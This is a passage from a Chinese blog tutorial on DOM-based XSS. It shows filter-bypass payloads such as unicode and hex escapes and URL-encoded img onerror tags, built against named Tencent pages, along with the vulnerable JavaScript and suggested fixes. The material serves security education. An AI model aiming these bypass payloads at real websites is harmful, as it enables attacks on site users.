+<blockquote>
+<p>看看源码中的输出。<code>\\</code> 被我们变成了 <code>乱码+\</code></p>
+<p><img src="7-4.webp" alt=""></p>
+<p><img src="7-5.webp" alt=""></p>
+</blockquote>
+<h1 id="DOM-XSS"><a href="#DOM-XSS" class="headerlink" title="DOM XSS"></a>DOM XSS</h1><p>DOM XSS是一类特殊的反射型XSS，但是一般的反射型XSS，XSS代码是通过服务器返回到客户端的，而典型的DOM XSS，XSS的代码是由操作DOM的js动态形成的，在服务器返回的原始HTML中，是不存在XSS攻击的代码。有关DOM XSS的更多内容，可以看窝翻译的这篇文章 <a href="https://cyto.top/2019/03/22/translation-DOM-Based-Cross-Site-Scripting-or-XSS-of-the-Third-Kind/" target="_blank" rel="external">https://cyto.top/2019/03/22/translation-DOM-Based-Cross-Site-Scripting-or-XSS-of-the-Third-Kind/</a></p>
+<h2 id="8-Dom-Xss入门-显式输出"><a href="#8-Dom-Xss入门-显式输出" class="headerlink" title="8. Dom Xss入门 [显式输出]"></a>8. Dom Xss入门 [显式输出]</h2><p>DOM XSS，模型：<code>innerHTML=&quot;[输出]&quot;</code></p>
+<blockquote>
+<p>反射型XSS部分，就到这里了。 接着我们进入Dom Xss的部分。 Dom Xss相比反射型XSS，脑袋需要多思考一层。 也就是说，<strong>我们关注的不仅是【输出】了什么，还要了解这个页面里，【javascript】拿这个【输出】干了什么。 </strong>为了循序渐进，本例讲到的是，【输出】直接在源代码可见的情况。</p>
+<p>在学习Dom Xss之前，先来补习点 html, js 的基础知识。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&gt; &lt;div id=&quot;a&quot;&gt;xxx&lt;/div&gt;</div><div class="line">&gt; &lt;script&gt;</div><div class="line">&gt;   document.getElementById(&quot;a&quot;).innerHTML=&quot;yyyyyy&quot;;</div><div class="line">&gt; &lt;/script&gt;</div><div class="line">&gt;</div></pre></td></tr></table></figure>
+</blockquote>
+<p>&gt;</p>
+<blockquote>
+<p><img src="8-0.webp" alt=""></p>
+<p>进一步，我们的 yyyyyy ，还可以是 HTML代码。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&gt; &lt;div id=&quot;a&quot;&gt;xxx&lt;/div&gt;</div><div class="line">&gt; &lt;script&gt;</div><div class="line">&gt;   document.getElementById(&quot;a&quot;).innerHTML=&quot;&lt;img src=1&gt;&quot;;</div><div class="line">&gt; &lt;/script&gt;</div><div class="line">&gt;</div></pre></td></tr></table></figure>
+<p><img src="8-1.webp" alt=""></p>
+<p>再进一步， JS的字符串中的字符可以写为 unicode编码。</p>
+<p>譬如： <code>&lt;</code> 可以表示为 <code>\u003c</code> , <code>&gt;</code> 可以表示为 <code>\u003e</code></p>
+<p>不知道怎么转义的，可以使用gainover的工具。 </p>
+<p>工具地址：<a href="http://app.baidu.com/app/enter?appid=280383" target="_blank" rel="external">http://app.baidu.com/app/enter?appid=280383</a></p>
+<p><img src="8-2.webp" alt=""></p>
+<p>上面的代码，可以进一步写为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&gt; &lt;div id=&quot;a&quot;&gt;xxx&lt;/div&gt;</div><div class="line">&gt; &lt;script&gt;</div><div class="line">&gt;   document.getElementById(&quot;a&quot;).innerHTML=&quot;\u003cimg src=1\u003e&quot;;</div><div class="line">&gt; &lt;/script&gt;</div><div class="line">&gt;</div></pre></td></tr></table></figure>
+<p>漏洞点</p>
+<p><a href="http://datalib.ent.qq.com/cgi-bin/search?libid=1&amp;keyvalue=aaaaaaa&amp;attr=133&amp;stype=2&amp;tname=star_second.shtml" target="_blank" rel="external">http://datalib.ent.qq.com/cgi-bin/search?libid=1&amp;keyvalue=aaaaaaa&amp;attr=133&amp;stype=2&amp;tname=star_second.shtml</a></p>
+<p>和前面反射型的一样，我们先看看输出。</p>
+<p><img src="8-3.webp" alt=""></p>
+<p>相关代码，我也贴出来。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">&gt;&lt;strong id=&quot;titleshow&quot;&gt;按职业1检索：aaaaaaa &lt;/strong&gt;&lt;/div&gt;</div><div class="line">&gt;&lt;script&gt;</div><div class="line">&gt;if(&quot;aaaaaaa&quot;==&quot;&quot;)</div><div class="line">&gt;document.getElementById(&quot;titleshow&quot;).innerHTML=&quot;按地区检索：全部明星&quot;;</div><div class="line">&gt;if(&quot;职业1&quot;==&quot;职业1&quot;)</div><div class="line">&gt;document.getElementById(&quot;titleshow&quot;).innerHTML=&quot;按职业检索：aaaaaaa&quot;;</div><div class="line">&gt;if(&quot;职业1&quot;==&quot;职业2&quot;)</div><div class="line">&gt;document.getElementById(&quot;titleshow&quot;).innerHTML=&quot;按职业检索：aaaaaaa&quot;;</div><div class="line">&gt;if(&quot;职业1&quot;==&quot;职业3&quot;)</div><div class="line">&gt;document.getElementById(&quot;titleshow&quot;).innerHTML=&quot;按职业检索：aaaaaaa&quot;;</div><div class="line">&gt;&lt;/script&gt;</div><div class="line">&gt;</div></pre></td></tr></table></figure>
+</blockquote>
+<p>&gt;</p>
+<blockquote>
+<p>一共有6处，有一处图上没显示,但是也没用处，这里不列出来了，看上面代码中的5处。我们已经知道，<code>&lt;</code>, <code>&gt;</code>, <code>&quot;</code> 都被过滤了， 用前面提到的某些技巧，似乎也无法直接XSS。那么该怎么办呢？</p>
+<p>上面代码中，实际上只有一句是运行了的。我们重点看它。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&gt;if(&quot;职业1&quot;==&quot;职业1&quot;)</div><div class="line">&gt;document.getElementById(&quot;titleshow&quot;).innerHTML=&quot;按职业检索：[输出]&quot;;</div><div class="line">&gt;</div></pre></td></tr></table></figure>
+</blockquote>
+<p>&gt;</p>
+<blockquote>
+<p>这里 [输出] 最然过滤了 <code>&lt;</code>, <code>&gt;</code> ，但是并没有过滤 <code>\</code> 。这样一来，大家应该清楚，为什么上面要说到 <code>&lt;</code> 可以写为 <code>\u003c</code> 了吧。 就是为了应付这种情况。</p>
+<p>因此，我们可以构造缺陷点的代码如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&gt; if(&quot;职业1&quot;==&quot;职业1&quot;)</div><div class="line">&gt; document.getElementById(&quot;titleshow&quot;).innerHTML=&quot;按职业检索：\u003img src=1 onerror=alert(1)\u003e&quot;;</div><div class="line">&gt;</div></pre></td></tr></table></figure>
+<p>经过运行后， titleshow 里的HTML就会变为 <code>&lt;img src=1 onerror=alert(1)&gt;</code> ，从而弹出1。</p>
+<p>对应的，我们的利用代码，可以写为如下，其中空格，我写为了<code>\u0020</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&gt; http://datalib.ent.qq.com/cgi-bin/search?libid=1</div><div class="line">&gt; &amp;keyvalue=\u003Cimg\u0020src=1\u0020onerror=alert(1)\u003e</div><div class="line">&gt; &amp;attr=133&amp;stype=2&amp;tname=star_second.shtml</div><div class="line">&gt;</div></pre></td></tr></table></figure>
+<p>看看对应的源代码，悲催的事情出现了， <code>\u003c</code> 和 <code>\u003e</code>竟然被腾讯过滤了。。。</p>
+<p><img src="8-4.webp" alt=""></p>
+<p>被过滤的原因，是因为 @Jannock 大牛在乌云报告过这个漏洞。</p>
+<p><a href="http://www.wooyun.org/bugs/wooyun-2012-011192" target="_blank" rel="external">WooYun: 跨站脚本-可以让战场离得更远（浅谈腾讯架构缺陷）</a></p>
+<p>其实我们还应该注意到上面图片中，过滤的实际上是<code>\u003c</code>和<code>\u003e</code>，但是并没有过滤<code>\u0020</code>，这说明，腾讯只是针对性的过滤，并没有过滤 <strong>反斜线</strong>。</p>
+<p>在JS字符串里， <code>&lt;</code> 不光可以写为 <code>\u003c</code>，还可以写为 <code>\x3c</code>， <code>&gt;</code> 同样可以写为 <code>\x3e</code>。我们试试腾讯过滤了这个没有呢？</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&gt; http://datalib.ent.qq.com/cgi-bin/search?libid=1</div><div class="line">&gt; &amp;keyvalue=\x3Cimg\u0020src=1\u0020onerror=alert(1)\x3e</div><div class="line">&gt; &amp;attr=133&amp;stype=2&amp;tname=star_second.shtml</div><div class="line">&gt;</div></pre></td></tr></table></figure>
+<p><img src="8-5.webp" alt=""></p>
+<p>没被过滤</p>
+<p><img src="8-6.webp" alt=""></p>
+<p>总结一下：</p>
+<p>本例中, 是<code>innerHTML</code>的情况</p>
+<p>但 <strong>只要是与改变页面HTML内容相关的操作，都可能导致这种问题。</strong> 比如：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&gt; document.getElementById(&quot;y&quot;).innerHTML=&quot;xxxxxxxxxx&quot;;</div><div class="line">&gt; document.write(&quot;xxxxxxxxxxxx&quot;);</div><div class="line">&gt; 还有一些网站，使用了第三方的JS库，譬如jQuery时，会有</div><div class="line">&gt; $(&quot;#y&quot;).html(&quot;xxxxxxx&quot;);</div><div class="line">&gt;</div></pre></td></tr></table></figure>
+<p>最后，还需要注意一下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&gt; aa.innerHTML=&quot;xxxxxxxxxxxx&quot;; </div><div class="line">&gt;</div></pre></td></tr></table></figure>
+<p>这种情况下。xxxxx只能使用 <code>&lt;img src=1 onerror=alert(1)&gt;</code> 这种方式来触发JS。</p>
+<p>而不能以 <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> 来触发，因为这种压根不会执行<code>&lt;script&gt;..&lt;/script&gt;</code>之间的内容。 IE下，可以使用 <code>&lt;script defer&gt;alert(1)&lt;/script&gt;</code>。</p>
+<p>修复方案：</p>
+<p>方法1. 输出时，过滤 <code>\</code></p>
+<p>方法2. <code>innerHTML=encodeHTML([输出])</code></p>
+</blockquote>
+<h2 id="9-Dom-Xss入门-隐式输出"><a href="#9-Dom-Xss入门-隐式输出" class="headerlink" title="9. Dom Xss入门 [隐式输出]"></a>9. Dom Xss入门 [隐式输出]</h2><p><a href="https://shuimugan.com/bug/view?bug_no=16150" target="_blank" rel="external">https://shuimugan.com/bug/view?bug_no=16150</a></p>
+<p>DOM XSS</p>
+<blockquote>
+<p>上一篇开始说Dom Xss了，我们说的是显式输出的情况，即我们可以在右键查看源代码的时候，看到我们所输出的内容。而有一些时候，输出操作我们是看不见的。它们通常发生在javascript代码中。譬如：<code>var x=location.href;</code> 这句Javascript实际上进行了一个隐藏的输出操作，即将<code>location.href</code>的内容输出到了x变量中。一起来看看相关的例子吧～</p>
+<p>在说实际例子前，我们来说一个前端开发人员非常习惯使用的一段代码。下面大致写下伪代码。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">&gt; function getParam(参数名)&#123;</div><div class="line">&gt; 		//获取地址栏参数,通常是 a=1&amp;b=2&amp;c=3;</div><div class="line">&gt; 		var x=location.search;//或者是location.hash</div><div class="line">&gt; </div><div class="line">&gt; 		//此时x=&quot;?a=1&amp;b=2&amp;c=3&quot;;</div><div class="line">&gt; 		//根据[参数名]取出参数名对应的值</div><div class="line">&gt; 		//例如 参数名=a， 则y=1</div><div class="line">&gt; 		//例如 参数名=b,  则y=2</div><div class="line">&gt; 		//至于这里怎么实现这个功能，可以用循环，可以用indexOf，可以用正则</div><div class="line">&gt; 	</div><div class="line">&gt; 		var y= 参数名对应的参数值;</div><div class="line">&gt; </div><div class="line">&gt; 		return y;</div><div class="line">&gt; &#125;</div><div class="line">&gt;</div></pre></td></tr></table></figure>
+<p>它的作用呢？就是从地址栏的参数里取出内容。譬如：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&gt; http://www.some.com/2.html?name=shouzi&amp;age=20</div><div class="line">&gt;</div></pre></td></tr></table></figure>
+<p>我们在2.html，要显示 name 对应的值。对应的代码则非常可能下面这样写：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">&gt; &lt;div id=&quot;nick&quot;&gt;加载中...&lt;/div&gt;</div><div class="line">&gt; &lt;script&gt;</div><div class="line">&gt; var a=getParam(&quot;name&quot;);  //获取地址栏里的name参数，即shouzi</div><div class="line">&gt; document.getElementById(&quot;nick&quot;).innerHTML=a;</div><div class="line">&gt; &lt;/script&gt;</div><div class="line">&gt;</div></pre></td></tr></table></figure>
+<p>此时，将<code>a=&lt;img src=1 onerror=alert(1);&gt;</code>传入，就会造成8中的DOM XSS</p>
+</blockquote>
+<p>看这节课的案例：</p>
+<blockquote>
+<p>漏洞点：</p>
+<p><a href="http://qt.qq.com/video/play_video.htm?sid=aaaaaa" target="_blank" rel="external">http://qt.qq.com/video/play_video.htm?sid=aaaaaa</a></p>
+<p>和原来的不同，我们在源代码里搜索不到东西的哦～ </p>
+<p><img src="9-0.webp" alt=""></p>
+<p>那可能这里有人会有一个疑问了。那我们怎么知道有没有漏洞呢？ 别担心，方法是有的。</p>
+<p>这里以chrome为例，按F12，打开调试工具，见下图</p>
+<p><img src="9-1.webp" alt=""></p>
+<p>和查看源代码没有什么不同，只是这次是在调试工具里看而已。</p>
+<p>通过上面的方式，确定【可能】有漏洞之后。我们可以有2个方式来进行下一步。</p>
+<p>1 直接根据调试工具里看到的HTML代码情况，来构造利用代码。 优点：省时间，缺点：如果对方有一定过滤，就很难构造</p>
+<p>2 定位到与这个缺陷参数sid相关的JS代码，再来构造利用代码。优点：能利用一些复杂的情况， 缺点：耗时间。</p>
+<h3 id="先看1的情况。看到步骤5里面的那个图。我们可以构造以下代码。"><a href="#先看1的情况。看到步骤5里面的那个图。我们可以构造以下代码。" class="headerlink" title="先看1的情况。看到步骤5里面的那个图。我们可以构造以下代码。"></a>先看1的情况。看到步骤5里面的那个图。我们可以构造以下代码。</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">&gt; &lt;object width=&quot;100%&quot; height=&quot;100%&quot; id=&quot;f&quot; classid=&quot;clsid:d27cdb6e-ae6d-11cf-96b8-444553540000&quot; codebase=&quot;http://fpdownload.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=8,0,0,0&quot;&gt;</div><div class="line">&gt; 		&lt;param name=&quot;movie&quot; value=&quot;aaaaaa&quot;&gt;&lt;/object&gt;&lt;img src=&quot;1&quot; onerror=&quot;alert(1)&quot;&gt;</div><div class="line">&gt; 		...</div><div class="line">&gt;</div></pre></td></tr></table></figure>
+<p>对应的图片解析：</p>
+<p><img src="9-2.webp" alt=""></p>
+<p>进而“试探性”的测试一下利用代码，因为我们不知道对方会不会过滤掉 “双引号”，“括号”之类的，只能试试了。。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&gt; http://qt.qq.com/video/play_video.htm?sid=aaaaaa&quot;&gt;&lt;/object&gt;&lt;img src=&quot;1&quot; onerror=&quot;alert(1)</div><div class="line">&gt;</div></pre></td></tr></table></figure>
+<p>没反应，我们继续看看调试工具，发现，双引号，变成了 \“ 。</p>
+<p><img src="9-3.webp" alt=""></p>
+<p>根据这个情况，我们可以进一步修改代码。<img>标签里不使用双引号。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&gt; http://qt.qq.com/video/play_video.htm?sid=aaaaaa&quot;&gt;&lt;/object&gt;&lt;img src=1 onerror=alert(1)&gt;</div><div class="line">&gt;</div></pre></td></tr></table></figure>
+<p><img src="9-4.webp" alt=""></p>
+<p>可以看到，这种方式，写利用代码很快。</p>
+<h3 id="再来看看-2-的方法"><a href="#再来看看-2-的方法" class="headerlink" title="再来看看 2 的方法"></a>再来看看 2 的方法</h3><p>既然我们知道了，sid这个参数会被使用。 那么我们的目标是，javascript的代码里哪里使用了sid这个参数呢？</p>
+<p>我们首先，F12打开调试工具，点【Resources】，再点Frames, 然后 Ctrl+ F搜索 “sid” 或者 ‘sid’</p>
+<p><img src="9-5.webp" alt=""></p>
+<p>可以看到是 getUrlPara(“sid”)，从单词，我们不难猜出，getUrlPara就是前面我们提到的 “获取地址栏参数“的函数。</p>
+<p>为了进一步确定，我们可以很方便的在console里查看getUrlParam函数是啥样的。</p>
+<p><img src="9-6.webp" alt=""></p>
+</blockquote>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">function getUrlPara(paraName, sUrl) &#123;</div><div class="line">    if (typeof(sUrl) == &apos;undefined&apos;) &#123; // sUrl未定义，</div><div class="line">        sUrl = document.location.href; // 初始化为document.location.href，即当前页面url</div><div class="line">    &#125;</div><div class="line">    var urlRegex = new RegExp(paraName+&quot;=[^&amp;#\?]*&quot;, &quot;igm&quot;); // 根据参数名用正则匹配，匹配 参数名=参数值 的形式</div><div class="line">    var para = sUrl.match( urlRegex ); // 匹配的结果赋值给para</div><div class="line">    if (!para) &#123;</div><div class="line">        return &quot;&quot;; // 如果没有匹配到，返回空串</div><div class="line">    &#125;</div><div class="line">    var v = para[0]; // 如果匹配到，把匹配到的第一对名和值赋值给v</div><div class="line">    from = v.indexOf( &quot;=&quot; ); // 获取参数值起始位置</div><div class="line">    var paraValue = v.substr(from+1, v.length); // 获取参数值</div><div class="line">    while ( paraValue.indexOf(&apos;&lt;&apos;) &gt;= 0) &#123; // 如果存在&lt;，则过滤掉</div><div class="line">        paraValue = paraValue.replace(&apos;&lt;&apos;, &apos;&apos;);</div><div class="line">    &#125;</div><div class="line">    if( paraValue .indexOf( &quot;#&quot; ) &gt; 0 ) &#123; // 是否存在锚点</div><div class="line">        from = paraValue .indexOf( &quot;#&quot; ); // 如果存在#(锚点)</div><div class="line">        paraValue = paraValue .substr(0, from ); // 截取到锚点之前</div><div class="line">    &#125;</div><div class="line">    return paraValue; // 返回处理后的参数值</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+<blockquote>
+<p>可以看到，实际上getUrlParam是对<code>&lt;</code>, <code>&gt;</code> 做了过滤， 但是由于chrome浏览器自身的XSS防御机制，导致location.href获取的location.href是已经经过编码的。从而导致未过滤。</p>
+<p><img src="9-7.webp" alt=""></p>
+<p>按道理，location.href里的<code>&lt;</code>, <code>&gt;</code> ,<code>&quot;</code> 已经变成了 <code>%3c</code>, <code>%3e</code>, <code>%22</code>已经被过滤了，不会有XSS了，为什么还可以呢？我们进一步往后看。</p>
+<p><img src="9-8.webp" alt=""></p>
+</blockquote>
+<p><code>decodeURIComponent(sid)</code>方法用于解码由encodeURIComponent 方法或者其它类似方法编码的URL</p>
+<p><code>trim()</code>从一个字符串的两端删除空白字符</p>
+<blockquote>
+<p>看来，关键就是这里，这里有一步<code>decodeURIComponent</code>的操作，会将 <code>%3c</code>, <code>%3e</code>，又变回 <code>&lt;</code>, <code>&gt;</code></p>
+<p>供参考的完整的缺陷代码。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">&gt; var sid=getUrlPara(&quot;sid&quot;);</div><div class="line">if(!sid || sid==&quot;&quot;)&#123;</div><div class="line">	document.getElementById(&quot;dv_video&quot;).innerHTML=&apos;&lt;div class=&quot;errmsg&quot; style=&quot;margin-top:-10px;&quot;&gt;抱歉，视频不存在！&lt;/div&gt;&apos;;</div><div class="line">&#125;else&#123;</div><div class="line">	var flash_ver=GetSwfVer();</div><div class="line">	if(flash_ver == -1)&#123;</div><div class="line">		document.getElementById(&quot;dv_video&quot;).innerHTML=&apos;&lt;div class=&quot;errmsg&quot; style=&quot;margin-top:-30px;&quot;&gt;抱歉，您还没有安装flash插件&lt;br/&gt;请&lt;a target=&quot;_blank&quot; href=&quot;http://www.macromedia.com/go/getflashplayer&quot;&gt;下载&lt;/a&gt;10.0以上的flash播放器&lt;br/&gt;安装flash后，请&lt;a href=&quot;javascript:location.reload();&quot;&gt;点此刷新&lt;/a&gt;&lt;/div&gt;&apos;;</div><div class="line">	&#125;else if(flash_ver.split(&apos;.&apos;)[0]&lt;10)&#123;</div><div class="line">		document.getElementById(&quot;dv_video&quot;).innerHTML=&apos;&lt;div class=&quot;errmsg&quot; style=&quot;margin-top:-30px;&quot;&gt;抱歉，您的flash版本过低&lt;br/&gt;请&lt;a target=&quot;_blank&quot; href=&quot;http://www.macromedia.com/go/getflashplayer&quot;&gt;下载&lt;/a&gt;10.0以上的flash播放器&lt;br/&gt;安装flash后，请&lt;a href=&quot;javascript:location.reload();&quot;&gt;点此刷新&lt;/a&gt;&lt;/div&gt;&apos;;</div><div class="line">	&#125;else&#123;</div><div class="line">		sid=decodeURIComponent(sid).trim().replace(/([\&apos;\&quot;])/g,&apos;\\\\$1&apos;);</div><div class="line">		if(!is_valid_sid(sid))&#123;</div><div class="line">			document.getElementById(&quot;dv_video&quot;).innerHTML=&apos;&lt;div class=&quot;errmsg&quot; style=&quot;margin-top:-10px;&quot;&gt;无法打开视频文件，视频地址不合法！&lt;/div&gt;&apos;;</div><div class="line">		&#125;else&#123;</div><div class="line">			insertFlash(&quot;dv_video&quot;,&quot;f&quot;,sid,&quot;100%&quot;,&quot;100%&quot;);</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">&#125;</div><div class="line">&gt;</div></pre></td></tr></table></figure>
+<p>接着，会调用 insertFlash(“dv_video”,”f”,sid,”100%”,”100%”);</p>
+<p>insertFlash里，也并没有对sid进行任何过滤。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">&gt; function insertFlash(elm, eleid, url, w, h) &#123;</div><div class="line">    if (!document.getElementById(elm)) return;</div><div class="line">    var str = &apos;&apos;;</div><div class="line">    str += &apos;&lt;object width=&quot;&apos; + w + &apos;&quot; height=&quot;&apos; + h + &apos;&quot; id=&quot;&apos; + eleid + &apos;&quot; classid=&quot;clsid:d27cdb6e-ae6d-11cf-96b8-444553540000&quot; codebase=&quot;http://fpdownload.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=8,0,0,0&quot;&gt;&apos;;</div><div class="line">    str += &apos;&lt;param name=&quot;movie&quot; value=&quot;&apos; + url + &apos;&quot; /&gt;&apos;;</div><div class="line">    str += &apos;&lt;param name=&quot;allowScriptAccess&quot; value=&quot;never&quot; /&gt;&apos;;</div><div class="line">    str += &apos;&lt;param name=&quot;allowFullscreen&quot; value=&quot;true&quot; /&gt;&apos;;</div><div class="line">    str += &apos;&lt;param name=&quot;wmode&quot; value=&quot;transparent&quot; /&gt;&apos;;</div><div class="line">    str += &apos;&lt;param name=&quot;quality&quot; value=&quot;autohigh&quot; /&gt;&apos;;</div><div class="line">    str += &apos;&lt;embed width=&quot;&apos; + w + &apos;&quot; height=&quot;&apos; + h + &apos;&quot; name=&quot;&apos; + eleid + &apos;&quot; src=&quot;&apos; + url + &apos;&quot; quality=&quot;autohigh&quot; swLiveConnect=&quot;always&quot; wmode=&quot;transparent&quot; allowScriptAccess=&quot;never&quot; allowFullscreen=&quot;true&quot; type=&quot;application/x-shockwave-flash&quot; pluginspage=&quot;http://www.macromedia.com/go/getflashplayer&quot;&gt;&lt;/embed&gt;&apos;;</div><div class="line">    str += &apos;&lt;/object&gt;&apos;;</div><div class="line">    document.getElementById(elm).innerHTML = str</div><div class="line">&#125;</div><div class="line">&gt;</div></pre></td></tr></table></figure>
+<p>图片解析：</p>
+<p><img src="9-9.webp" alt=""></p>
+<p>根据以上分析，我们的利用代码可以写为。注意，%3E,%3C的编码是关键。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&gt; http://qt.qq.com/video/play_video.htm?sid=aaaaaa%22%3E%3C/object%3E%3Cimg%20src=1%20onerror=alert(1)%3E</div><div class="line">&gt;</div></pre></td></tr></table></figure>
+<p>非常值得说明的是：</p>
+<p>如果采用6.1的方法，我们得到的利用代码是</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&gt; http://qt.qq.com/video/play_video.htm?sid=aaaaaa&quot;&gt;&lt;/object&gt;&lt;img src=1 onerror=alert(1)&gt;</div><div class="line">&gt;</div></pre></td></tr></table></figure>
+<p>!! 这个代码在IE下，是没法XSS的。</p>
+<p>而通过6.2的方法，去分析JS代码，我们则可以构造出通用的XSS代码。</p>
+</blockquote>
+<h2 id="10-Dom-Xss进阶-邂逅eval"><a href="#10-Dom-Xss进阶-邂逅eval" class="headerlink" title="10. Dom Xss进阶 [邂逅eval]"></a>10. Dom Xss进阶 [邂逅eval]</h2><p>DOM XSS</p>
+<blockquote>
+<p>前面的教程，说到了显式输出和隐式输出。但是不论怎么样，因为最终javascript都会通过document.write或innerHTML将内容输出到网页中，所以我们总是有办法看到输出到哪里。 但是有时候，我们的输出，最终并没有流向innerHTML或document.write，而是与eval发生了邂逅，我们该怎么挖掘并利用呢？ </p>
+<p>漏洞点</p>
+<p><a href="http://kf.qq.com/search_app.shtml?key=aaaaa" target="_blank" rel="external">http://kf.qq.com/search_app.shtml?key=aaaaa</a></p>
+<p>和前面的不同之处，这次我们搜索源代码和调试工具都看不到任何东西。</p>
+<p><img src="10-0.webp" alt=""></p>
+<p>这个时候，我们可以看看Console，看看有没有其它有用的东西～～</p>
+<p>一般来说，默认情况下，是不会有问题的。我们可以给参数加一些特殊符号。</p>
+<p>这里我比较习惯用\，因为这玩意比较好使。当然你也可以用其它比较特殊的符号，比如双引号，单引号，只是被过滤掉的几率比较大。</p>
+<p>这个时候，我们看看Console里面，多出了一条错误。</p>
+<p><img src="10-1.webp" alt=""></p>
+<p>我们可以点右侧，直接定位到错误代码。</p>
+<p><img src="10-2.webp" alt=""></p>
+<p>点进去后，可以看到是哪个地方出错了。</p>
+<p><img src="10-3.webp" alt=""></p>
+<p>我们来看看这段代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">&gt; var getarg = function()</div><div class="line">&#123;</div><div class="line">	var url = window.location.href;</div><div class="line">	var allargs = url.split(&quot;?&quot;)[1];</div><div class="line">	if (allargs!=null &amp;&amp; allargs.indexOf(&quot;=&quot;)&gt;0)</div><div class="line">	&#123;</div><div class="line">		var args = allargs.split(&quot;&amp;&quot;);</div><div class="line">		for(var i=0; i&lt;args.length; i++)</div><div class="line">		&#123;</div><div class="line">			var arg = args[i].split(&quot;=&quot;);</div><div class="line">			eval(&apos;this.&apos;+arg[0]+&apos;=&quot;&apos;+arg[1]+&apos;&quot;;&apos;);</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">&#125;;</div><div class="line">&gt;</div></pre></td></tr></table></figure>
+<p>和上一节教程类似，这段代码，实际上也是一个获取地址栏参数的代码。</p>
+<p>比如，地址栏是key=aaaa; 那么 arg[0] 就是字符串’key’, arg[1] 就是字符串 ‘aaaa’;</p>
